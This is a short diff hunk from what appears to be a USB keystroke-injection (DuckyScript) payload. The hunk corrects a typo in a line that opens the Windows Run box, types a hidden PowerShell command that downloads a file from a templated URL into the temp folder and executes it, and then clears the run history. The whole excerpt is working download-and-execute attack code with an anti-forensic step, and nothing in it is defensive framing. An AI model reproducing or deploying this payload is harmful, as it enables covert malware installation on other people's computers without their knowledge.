@@ -35,7 +35,7 @@ ENTER
 DELAY 500
 GUI R
 DELAY 200
-STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('{0}', '%TEMP%\{1}>'); Start-Process "%TEMP%\{1}"
+STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('{0}', '%TEMP%\{1}'); Start-Process "%TEMP%\{1}"
 ENTER
 REM
 REM CLEAR THE RUN HISTORY
